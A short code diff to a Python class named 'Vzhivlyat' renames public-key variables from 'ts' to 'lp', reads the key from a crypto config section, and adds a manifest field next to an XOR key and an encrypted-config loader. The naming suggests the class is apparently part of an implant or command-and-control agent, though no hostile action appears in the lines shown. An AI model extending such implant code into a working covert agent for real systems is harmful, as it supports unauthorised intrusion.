@@ -26,11 +26,13 @@ class Vzhivlyat(object):
         # Crypto values
         self.initial_private_key = asymmetric.private_key_from_bytes(self.config['crypto']['priv_key'])
         self.initial_public_key = self.initial_private_key.public_key
-        self.initial_ts_pubkey = asymmetric.public_key_from_bytes(self.config['crypto']['lp_pk'])
+        self.initial_lp_pubkey = asymmetric.public_key_from_bytes(self.config['crypto']['lp_pk'])
         self.current_private_key = self.initial_private_key
         self.current_public_key = self.initial_public_key
-        self.current_ts_pubkey = self.initial_ts_pubkey
+        self.current_lp_pubkey = self.initial_lp_pubkey
         self.xor_key = ast.literal_eval(self.config['crypto']['xor_key'])
+
+        self.manifest = None
 
     def decrypt_config(self):
         with open(self.config_file_path, "rb+") as configfile:
